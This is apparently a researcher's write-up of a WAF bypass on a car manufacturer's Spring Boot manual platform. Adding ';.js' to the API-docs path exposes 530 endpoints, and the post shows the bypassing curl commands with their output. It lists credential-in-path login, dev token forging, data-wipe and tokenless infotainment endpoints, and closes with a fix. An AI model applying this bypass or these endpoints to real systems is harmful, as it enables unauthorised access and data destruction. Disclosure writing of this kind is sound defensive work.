How a Semicolon Exposed 530 API Endpoints on a Major Car Manufacturer's Platform

I was looking at the digital manual platform of one of the biggest car manufacturers in the world. The system serves vehicle documentation in 45 languages and connects to the in-car infotainment system. It runs on Spring Boot.

Standard recon: check for /v3/api-docs. Blocked. Connection reset. WAF doing its job.

Then I added ;.js to the path.

# Blocked
curl -sk "https://[TARGET]/v3/api-docs"
# Status: 000, Size: 0

# Bypassed
curl -sk "https://[TARGET]/v3/api-docs;.js"
# Status: 200, Size: 496362

Half a megabyte of OpenAPI spec. 530 endpoints. The WAF saw a .js file request. Spring Boot stripped the semicolon (matrix parameter per RFC 3986) and served the docs.

Same bypass worked on all 5 hosts including production.

What was inside

Credentials in URL paths:

GET /api/moapi/V9/authenticate/auth/{userName}/{password}

Every login attempt logged in plaintext in access logs, proxy logs, browser history. I confirmed the endpoint accepted requests on production without auth - returned [] for bad creds instead of an error.

Dev endpoints on production:

POST /api/dev/consumer/token/create
GET  /api/dev/consumer/token/decode

Token create + decode = forged auth.

Internal service token endpoints:

GET /api/vw-services/V1/idk/access-token
GET /api/vw-services/V1/gvf/auth-token

Destructive admin ops:

POST /api/data/V2/clear          -- wipes all data
DELETE /api/users/V1/user/{name} -- deletes users

In-car infotainment management:

GET /api/mibtokenless/V1/queryRemoteReset
GET /api/mibtokenless/V1/downloadPackages/{f}/{token}

The word "tokenless" in that path tells you everything.

Why it works

The WAF and Spring Boot parse URLs differently. WAF sees /v3/api-docs;.js as a JS file. Spring sees /v3/api-docs with a matrix param. Two parsers, two interpretations, one gap.

Fix: enable StrictHttpFirewall in Spring Security (rejects semicolons), or just disable API docs in prod.

This bypass is well documented. It keeps working because WAF rules match what the WAF sees, not what the app sees.
